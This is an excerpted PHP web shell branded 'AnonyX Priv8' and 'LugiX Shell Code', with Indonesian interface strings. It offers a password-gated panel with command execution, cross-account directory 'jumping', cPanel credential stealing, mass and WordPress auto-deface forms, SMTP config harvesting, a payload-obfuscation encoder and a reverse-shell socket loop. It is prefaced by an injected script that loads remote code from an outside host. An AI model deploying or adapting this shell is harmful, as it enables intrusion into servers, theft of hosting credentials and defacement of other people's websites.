...
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH22OQt8P3feq%2byfjwksyVyR5dwy%2fLL9HDSEBuTSvLpBHPLLxokncBHWePeqEPS%2fyA8cCSNXtr4AA6eV1XoMwZH3sXesst0h%2bBxfZWJbybdJj7y5uF65q7w3DdP%2f3aLx54wxKjie60KX2Ydj11JmPMY9bZCKo9T5QOpqyhliiPgj4LxN7zl9nhqN%2fg7h7WpYf1JCZrv6pYIq4GH7%2bx%2bwA5wXxVIVSzNqZDrm%2f9Nuixp03Xb5ocRt1RwuS48HZGWg%2fwt%2fvS5Vz%2bc5pMldbOw9pIRHBulbaKWJhd9PXP%2fnwsk6z9%2behbNcVaz%2f0fh%2fl6ItikOAQ2e7IkfucVMQ5b2ka9npgA3VeiFBff%2fgx5OxTbD1sfb%2bY98BOpbeO6ZQbX1j8D1KHeo2PJDiB4RcE2eWOG8I1Nz4%2bvOaqsZPL%2b5NFdQG7CJyoVI0KcAvCaJDuBL64x6k8c2YPHXdQRcu3ashNVh%2bde%2boEGsOGmh%2fzqukz0WJpXQQ3j1JNDfiGVJJgr6h%2fPN6dzu0DcQzBifCct29UOTb%2bRgX1PEAgB2eSWBiryaKJpo51NNXZBivqZ%2fIMhW7VoZ%2b2Zm9TMhxfU%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body></html>
...
<input type="password" name="pass" placeholder="Input The passwd"> <br><br>
<input type="submit" value="Login" class="own"></center>';
}
...
<html>
<head>
<title>AnonyX Priv8 Shell</title>
<meta name='author' content='Appan Sih Anjink!1!1!1'>
<meta charset="UTF-8"> 
<link href='https://cdn.weasyl.com/static/media/31/34/b1/3134b18cb985f08053235b9a5e4b91a0078a815b893241bba253523e9f87cd15.png' rel='icon' type='image/x-icon'/>
<style type='text/css'>
...
echo "<BR>";
echo "<center><font color='lime'>AnonyX Priv8</font>";
echo "<br>";
echo "<p>";

echo "<li> <a href='?'>Home</a> </li>";
echo "<a style='color: red;' href='?dir=$dir&do=infosys'>Info Website</a> </li>";
...
echo "<li> <a href='?dir=$dir&do=cmd'>Command</a> </li>";echo "<li> <a href='?dir=$dir&do=autoklik'>Priv Auto Deface</a> </li>";
...
echo "BELUM ADA FITUR INI COEG. MAAF EA";
} elseif($_GET['do'] == 'whois') {
?>
<body >
<center>
<br>
<form method="post"><br>
<textarea class='inputz' cols=30 rows=5 name="mbutt" style="background:transparent;color:lime;"></textarea><br><br>
<select class='inputz' size="1" name="ope" style="background:red;color:lime;">
<option style='background:transparent;color:lime;'><center>[#] Encryption [#]</option>
<option value="urlencode" style='background:transparent;color:lime;'>url</option>
<option value="base64" style='background:transparent;color:lime;'>Base64</option>
<option value="ur" style='background:transparent;color:lime;'>convert_uu</option>
<option value="json" style='background:transparent;color:lime;'>json</option>
<option value="gzinflates" style='background:transparent;color:lime;'>gzinflate - base64</option>
<option value="str2" style='background:transparent;color:lime;'>str_rot13 - base64</option>
<option value="gzinflate" style='background:transparent;color:lime;'>str_rot13 - gzinflate - base64</option>
<option value="gzinflater" style='background:transparent;color:lime;'>gzinflate - str_rot13 - base64</option>
<option value="gzinflatex" style='background:transparent;color:lime;'>gzinflate - str_rot13 - gzinflate - base64</option>
<option value="gzinflatew" style='background:transparent;color:lime;'>str_rot13 - convert_uu - url - gzinflate - str_rot13 - base64 - convert_uu - gzinflate - url - str_rot13 - gzinflate - base64</option>
<option value="str" style='background:transparent;color:lime;'>str_rot13 - gzinflate - str_rot13 - base64</option>
<option value="url" style='background:transparent;color:lime;'>base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
<option value="hexencode" style='background:transparent;color:lime;'>Hex Encode/Decode</option>
<option value="md5" style='background:transparent;color:lime;'><center>MD5 Hash</option>
<option value="sha1" style='background:transparent;color:lime;'>SHA1 Hash</option>
<option value="str_rot13" style='background:transparent;color:lime;'>ROT13 Hash</option>
<option value="strlen" style='background:transparent;color:lime;'>strlen</option>
<option value="xxx" style='background:transparent;color:lime;'>unescape</option>
<option value="bbb" style='background:transparent;color:lime;'>charAt</option>
<option value="aaa" style='background:transparent;color:lime;'>chr - bin2hex - substr</option>
<option value="www" style='background:transparent;color:lime;'>chr</option>
<option value="sss" style='background:transparent;color:lime;'>htmlspecialchars</option>
<option value="eee" style='background:transparent;color:lime;'>escape</option></select><br><input class='inputzbut' type='submit' name='submit' value='Encode' style="background:transparent;color:lime;">
<input class='inputzbut' type='submit' name='crack' value='Decode' style="background:transparent;color:lime;"><br>
</select>?
</form>
<?php
$submit = $_POST['submit'];
...
echo "<from><center><h3><font size=4 face=chiller color=lime>LugiX SHell Code</h3></center><textarea cols=70 rows=20 style='onfocus();font-weight:bold;color:red;background-image: transparent;opacity:0.40;background-size:100%;background-repeat: no-repeat;' class='inputz' readonly>".$html."</textarea><BR/><BR/></center></from>";
?>
         ...
         if($file==$_SERVER['DOCUMENT_ROOT'].$_SERVER['PHP_SELF']){
            ...
            if($sis<>"1"){
               if((@preg_match("/system\((.*?)\)/", $op))&&(@preg_match("/<pre>/", $op))&&(@preg_match("/empty\((.*?)\)/", $op))) {
                  ...
                  ?>
                  <tr style ="background-color: Your background Color;" onmouseover="mover(this)"  onmouseout="mout(this)">
                     <td align="right"><font color="lime"><?=$i?></font></td>
                     <td align="center"><font color="lime"><?=$val?></font></td>
                     <td align="left">
                     ...
                     <td align="center"><font color="lime"><?=$last?> GMT+9</font></td>
                     <td align="right"><font color="lime"><?=$size?> byte</font></td>
                     <script language="javascript">
                        var bgcolor = "transparent";
                        var change_color = "#444444"
                        function mover(aa) {
...
if (eregi('200', $headers[0])) {
    ...
    <textarea name='script' style='width: 450px; height: 200px;'>Your Script deface </textarea><br>
                ...
                while($gets = fgets($f)) {
                    ...
                    if(is_dir($dir_user) === true) {
                        ...
                        if(is_readable($url_user)) {
                            $i++;
                            $jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=lavender>$url_user</font></a>";
                            if(is_writable($url_user)) {
                                $jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=lavender>$url_user</font></a>";
                            }
                            echo $jrw."<br>";
                        }
                    }
            ...
            if($passwd == '' || !$etc) {
                ...
                foreach($user_jumping[1] as $user_idx_jump) {
                    ...
                    if(is_readable($user_jumping_dir)) {
                        $i++;
                        $jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=lavender>$user_jumping_dir</font></a>";
                        if(is_writable($user_jumping_dir)) {
                            $jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=lavender>$user_jumping_dir</font></a>";
                        }
                        echo $jrw;
...
?>
<form method="post">
<input type="submit" name="s" value="NO.php">
</form>
<?php
$targets = explode("\r\n", $_POST['targets']);
if($_POST['s']) {
...
if(in_array($pipes[2], $read_a)){$input = fread($pipes[2], $chunk_size);fwrite($sock, $input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);$rsres = " ";$s_result .= $rsres;}
    ...
    if($_POST['hajar']) {
        ...
        Set User & Pass: <br>
        <input type='text' name='user_baru' value='your new user' placeholder='user_baru'><br>
        <input type='text' name='pass_baru' value='your new password' placeholder='pass_baru'><br>
    ...
    if($_POST['crack']) {
        ...
        if($i == 0) {
            ...
            echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>LugiX Shell Code.</font>";
        }
    } else {
        echo "<center>
        <form method='post'>
    ...
    if($_POST['crack']) {
        ...
        if($i == 0) {
            ...
            echo "<br>sukses deface ".$i." Cpanel by <font color=lime>Lugix Shell Code.</font>";
        }
    } else {
        echo "<center>
        <form method='post'>
        ...
        <span>NB: Harap Perhatikan bahwa anda sedang di dalam folder config file</span><br></center>";
    }
} elseif($_GET['do'] == 'smtp') {
    ...
    if($_POST['hajar']) {
        ...
        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
        Set Title: <br>
        <input type='text' name='new_title' value='Touched By : ' placeholder='New Title'><br><br>
...
echo "<center><form method='post'>
        ...
        <u>Team</u>: <br>
        <input type='text' name='tim' size='50' value='Your Team'><br>
        <u>Domains</u>: <br>
        <textarea style='width: 450px; height: 150px;' name='sites' placeholder='Http://site.co.li'></textarea><br>
...
echo "</center></table>";  
    ...
    if($_POST['auto_deface_wp']) {
        ...
        <input type='text' name='script' height='10' size='50' placeholder='Defaced By : ' required><br>
    ...
    if(is_dir($dir) === true) {
        if(!is_readable($dir)) {
            ...
            foreach($scandir as $dirx) {
                ...
                echo "<tr>";
                 echo "<td class='td_home'><img src='https://d2gg9evh47fn9z.cloudfront.net/800px_COLOURBOX6458762.jpg' widht='20' height='20'>$href</td>";
        ...
        foreach($scandir as $file) {
            ...
            echo "<tr>";
            echo "<td class='td_home'><img src='data:image/png;base64,' alt='Example' width='20' height='20'><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
    ...
    echo "<center>Copyright @ ".date("Y")." - AnonyX </font></a></center>";
}
?>
